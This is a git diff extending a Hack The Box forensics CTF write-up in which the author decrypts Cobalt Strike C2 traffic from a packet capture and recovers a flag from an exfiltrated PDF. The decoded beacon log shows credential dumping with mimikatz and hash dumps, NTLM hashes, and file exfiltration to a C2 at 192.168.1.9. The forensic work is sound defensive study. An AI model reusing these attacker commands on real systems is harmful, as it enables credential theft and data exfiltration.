@@ -93,6 +93,8 @@ https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decry
 https://blog.nviso.eu/2021/11/17/cobalt-strike-decrypting-obfuscated-traffic-part-4/
 https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/
 https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/
+https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py
+https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py
 ```
 
 11. First let's get the public and private key (if there is) using [this](https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/) python script.
@@ -177,12 +179,442 @@ Guessing Cobalt Strike version: 4.2 (max 0x003a)
 ![image](https://user-images.githubusercontent.com/70703371/214213540-3079eca4-993f-49ec-a757-0029d89f6cb0.png)
 
 
-14. The problem now is we didn't found the raw key.
+14. The problem now is we didn't have the raw key so we can't use the same method as the documentation we found for using `cs-parse-http-traffic.py`.
+15. But we can use the `SHA256 raw key`. For the flag we shall use `-k` -> `hmacaeskeys`. Because the `SHA256 raw key` has the same value for hmac - aes.
+
+![image](https://user-images.githubusercontent.com/70703371/214214498-86c9743d-5219-4c6f-ba87-8ce8cc2ebd5c.png)
 
 
+```
+python cs-parse-http-traffic.py -k bf2d35c0e9b64bc46e6d513c1d0f6ffe:3ae7f995a2392c86e3fa8b6fbc3d953a ../../../Downloads/htb/foren/capture.pcap
+```
+
+> RESULT
+
+```
+Packet number: 12
+HTTP response (for request 7 GET)
+Length raw data: 14336
+HMAC signature invalid
+Packet number: 47
+HTTP response (for request 23 GET)
+Length raw data: 206401
+HMAC signature invalid
+Packet number: 69
+HTTP response (for request 66 GET)
+Length raw data: 48
+Timestamp: 1637354721 20211119-204521
+Data size: 8
+Command: 27 GETUID
+ Arguments length: 0
+
+Packet number: 76
+HTTP request POST
+http://192.168.1.9/submit.php?id=1909272864
+Length raw data: 68
+Counter: 2
+Callback: 16 BEACON_GETUID
+b'WS02\\npatrick (admin)'
+
+Packet number: 101
+HTTP response (for request 86 GET)
+Length raw data: 87648
+Timestamp: 1637354781 20211119-204621
+Data size: 87608
+Command: 89 UNKNOWN
+ Arguments length: 87552
+ b'MZ\xe8\x00\x00\x00\x00[REU\x89\xe5\x81\xc3)\x1f\x00\x00\xff\xd3\x89\xc3Wh\x04\x00\x00\x00P\xff\xd0
+ MD5: 1e4b88220d370c6bc55e213761f7b5ac
+Command: 40 UNKNOWN
+ Arguments length: 40
+ Unknown1: 0
+ Unknown2: 1602864
+ Pipename: b'\\\\.\\pipe\\8e09448'
+ Command: b'net user'
+ b''
+
+Packet number: 109
+HTTP request POST
+http://192.168.1.9/submit.php?id=1909272864
+Length raw data: 724
+Counter: 3
+Callback: 24 BEACON_OUTPUT_NET
+b"Account information for npatrick on \\\\localhost:\n\nUser name                    npatrick\nFull Name                    npatrick\nComment                      Fleet Commander\nUser's Comment               \nCountry code                 0\nAccount active               Yes\nAccount expires              Never\nAccount type                 Admin\n\nPassword last set            221 hours ago\nPassword expires             Yes\nPassword changeable          Yes\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         \nLogon script                 \nUser profile                 \nHome directory               \nLast logon                   11/19/2021 12:41:23\n"
+
+Packet number: 135
+HTTP response (for request 119 GET)
+Length raw data: 82528
+Timestamp: 1637354843 20211119-204723
+Data size: 82501
+Command: 44 UNKNOWN
+ Arguments length: 82432
+ b'MZARUH\x89\xe5H\x81\xec \x00\x00\x00H\x8d\x1d\xea\xff\xff\xffH\x81\xc3T\x16\x00\x00\xff\xd3H\x89\x
+ MD5: 851cbc5a118178f5c548e573a719d221
+Command: 40 UNKNOWN
+ Arguments length: 53
+ Unknown1: 0
+ Unknown2: 1391256
+ Pipename: b'\\\\.\\pipe\\8a4f8bc8'
+ Command: b'dump password hashes'
+ b''
+
+Packet number: 143
+HTTP request POST
+http://192.168.1.9/submit.php?id=1909272864
+Length raw data: 548
+Counter: 4
+Callback: 21 BEACON_OUTPUT_HASHES
+b'Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nDefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nGuest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\nJohn Doe:1001:aad3b435b51404eeaad3b435b51404ee:37fbc1731f66ad4e524160a732410f9d:::\nnpatrick:1002:aad3b435b51404eeaad3b435b51404ee:3c7c8387d364a9c973dc51a235a1d0c8:::\nWDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:c81c8295ec4bfa3c9b90dcd6c64727e2:::\n'
+
+Packet number: 190
+HTTP response (for request 153 GET)
+Length raw data: 438896
+Timestamp: 1637354904 20211119-204824
+Data size: 438866
+Command: 44 UNKNOWN
+ Arguments length: 438784
+ b'MZARUH\x89\xe5H\x81\xec \x00\x00\x00H\x8d\x1d\xea\xff\xff\xffH\x81\xc3\xb8\x87\x00\x00\xff\xd3H\x8
+ MD5: b0cfbef2bd9a171b3f48e088b8ae2a99
+Command: 40 UNKNOWN
+ Arguments length: 66
+ Unknown1: 0
+ Unknown2: 2112152
+ Pipename: b'\\\\.\\pipe\\673dd5c0'
+ Command: b'mimikatz sekurlsa::logonpasswords'
+ b''
+
+Packet number: 204
+HTTP request POST
+http://192.168.1.9/submit.php?id=1909272864
+Length raw data: 4516
+Counter: 5
+Callback: 32 UNKNOWN
+
+Authentication Id : 0 ; 334782 (00000000:00051bbe)
+Session           : Interactive from 1
+User Name         : npatrick
+Domain            : WS02
+Logon Server      : WS02
+Logon Time        : 11/19/2021 12:40:19 PM
+SID               : S-1-5-21-3301052303-2181805973-2384618940-1002
+        msv :
+         [00000003] Primary
+         * Username : npatrick
+         * Domain   : .
+         * NTLM     : 3c7c8387d364a9c973dc51a235a1d0c8
+         * SHA1     : 44cb46af6b1e8c5873bee400115d1694e650c5b4
+        tspkg :
+        wdigest :
+         * Username : npatrick
+         * Domain   : WS02
+         * Password : (null)
+        kerberos :
+         * Username : npatrick
+         * Domain   : WS02
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 334736 (00000000:00051b90)
+Session           : Interactive from 1
+User Name         : npatrick
+Domain            : WS02
+Logon Server      : WS02
+Logon Time        : 11/19/2021 12:40:19 PM
+SID               : S-1-5-21-3301052303-2181805973-2384618940-1002
+        msv :
+         [00000003] Primary
+         * Username : npatrick
+         * Domain   : .
+         * NTLM     : 3c7c8387d364a9c973dc51a235a1d0c8
+         * SHA1     : 44cb46af6b1e8c5873bee400115d1694e650c5b4
+        tspkg :
+        wdigest :
+         * Username : npatrick
+         * Domain   : WS02
+         * Password : (null)
+        kerberos :
+         * Username : npatrick
+         * Domain   : WS02
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-19
+        msv :
+        tspkg :
+        wdigest :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        kerberos :
+         * Username : (null)
+         * Domain   : (null)
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 46420 (00000000:0000b554)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 46226 (00000000:0000b492)
+Session           : Interactive from 1
+User Name         : DWM-1
+Domain            : Window Manager
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-90-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WS02$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-20
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : ws02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 26445 (00000000:0000674d)
+Session           : Interactive from 0
+User Name         : UMFD-0
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-96-0-0
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 26411 (00000000:0000672b)
+Session           : Interactive from 1
+User Name         : UMFD-1
+Domain            : Font Driver Host
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-96-0-1
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 25289 (00000000:000062c9)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : 
+        msv :
+        tspkg :
+        wdigest :
+        kerberos :
+        ssp :
+        credman :
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WS02$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 11/19/2021 12:40:12 PM
+SID               : S-1-5-18
+        msv :
+        tspkg :
+        wdigest :
+         * Username : WS02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        kerberos :
+         * Username : ws02$
+         * Domain   : WORKGROUP
+         * Password : (null)
+        ssp :
+        credman :
+
+Extra packet data: b'\x00\x00\x00'
+
+Packet number: 217
+HTTP response (for request 214 GET)
+Length raw data: 80
+Timestamp: 1637354965 20211119-204925
+Data size: 43
+Command: 53 LIST_FILES
+ Arguments length: 35
+ b'\xff\xff\xff\xfe\x00\x00\x00\x1bC:\\Users\\npatrick\\Desktop\\*'
+ MD5: 2211925feba04566b12e81807ff9c0b4
+
+Packet number: 224
+HTTP request POST
+http://192.168.1.9/submit.php?id=1909272864
+Length raw data: 324
+Counter: 6
+Callback: 22 TODO
+b'\xff\xff\xff\xfe'
+----------------------------------------------------------------------------------------------------
+C:\Users\npatrick\Desktop\*
+D       0       11/19/2021 12:24:08     .
+D       0       11/19/2021 12:24:08     ..
+F       5175    11/11/2021 03:24:13     cheap_spare_parts_for_old_blimps.docx
+F       282     11/10/2021 07:02:24     desktop.ini
+F       24704   11/11/2021 03:22:16     gogglestown_citizens_osint.xlsx
+F       62393   11/19/2021 12:24:10     orders.pdf
+
+----------------------------------------------------------------------------------------------------
+
+Packet number: 237
+HTTP response (for request 234 GET)
+Length raw data: 80
+Timestamp: 1637355025 20211119-205025
+Data size: 44
+Command: 11 DOWNLOAD
+ Arguments length: 36
+ b'C:\\Users\\npatrick\\Desktop\\orders.pdf'
+ MD5: b25952a4fd6a97bac3ccc8f2c01b906b
+
+Packet number: 254
+HTTP request POST
+http://192.168.1.9/submit.php?id=1909272864
+Length raw data: 62572
+Counter: 7
+Callback: 2 DOWNLOAD_START
+ parameter1: 0
+ length: 62393
+ filenameDownload: C:\Users\npatrick\Desktop\orders.pdf
+
+Counter: 8
+Callback: 8 DOWNLOAD_WRITE
+ Length: 62393
+ MD5: 00f542efefccd7a89a55c133180d8581
+
+Counter: 9
+Callback: 9 DOWNLOAD_COMPLETE
+b'\x00\x00\x00\x00'
 
 
+Commands summary:
+ 11 DOWNLOAD: 1
+ 27 GETUID: 1
+ 40 UNKNOWN: 3
+ 44 UNKNOWN: 2
+ 53 LIST_FILES: 1
+ 89 UNKNOWN: 1
 
+Callbacks summary:
+ 2 DOWNLOAD_START: 1
+ 8 DOWNLOAD_WRITE: 1
+ 9 DOWNLOAD_COMPLETE: 1
+ 16 BEACON_GETUID: 1
+ 21 BEACON_OUTPUT_HASHES: 1
+ 22 TODO: 1
+ 24 BEACON_OUTPUT_NET: 1
+ 32 UNKNOWN: 1
+```
+
+16. We got these files:
+
+![image](https://user-images.githubusercontent.com/70703371/214214727-da805930-1f95-475a-bb45-0ba1a0693fc3.png)
+
+
+17. Let's crack all of these md5 hashes (some of them are duplicated).
+
+![image](https://user-images.githubusercontent.com/70703371/214214828-f7217fce-682c-4ea5-bdd9-944665653876.png)
+
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/214215068-b8891b6f-6eab-4a68-b58a-1f002aea1600.png)
+
+
+> OUR INTEREST
+
+![image](https://user-images.githubusercontent.com/70703371/214215199-a18c9ba3-51c1-4f54-b692-482edc4ecea3.png)
+
+
+18. Let's extract our files with `-e` flag using the same script and payload as before.
+
+```sh
+python cs-parse-http-traffic.py -k bf2d35c0e9b64bc46e6d513c1d0f6ffe:3ae7f995a2392c86e3fa8b6fbc3d953a -e ../../../Downloads/htb/foren/capture.pcap
+```
+
+> RESULT
+
+![image](https://user-images.githubusercontent.com/70703371/214215511-97db802c-a5a6-4c84-91b8-036e7e4c068f.png)
+
+
+19. I thought i might stuck here again for a while since i'm not familiar with the `.vir`. But when i tried to see it straight from the directory GUI. Found the flag inside the `.pdf` file.
+
+![image](https://user-images.githubusercontent.com/70703371/214215610-bb973f78-9eb9-4a85-aa11-c5330ef7e800.png)
+
+
+20. Got the flag!
+
+## FLAG
+
+```
+HTB{Th4nk_g0d_y0u_f0und_1t_0n_T1m3!!!!}
+```
+
+## LEARNING REFERENCES:
+
+```
+https://blog.nviso.eu/2021/10/21/cobalt-strike-using-known-private-keys-to-decrypt-traffic-part-1/
+https://blog.nviso.eu/2021/11/17/cobalt-strike-decrypting-obfuscated-traffic-part-4/
+https://blog.nviso.eu/2021/11/03/cobalt-strike-using-process-memory-to-decrypt-traffic-part-3/
+https://blog.didierstevens.com/2021/10/11/update-1768-py-version-0-0-8/
+https://github.com/DidierStevens/Beta/blob/master/cs-extract-key.py
+https://github.com/DidierStevens/Beta/blob/master/cs-parse-http-traffic.py
+```
 
 
 
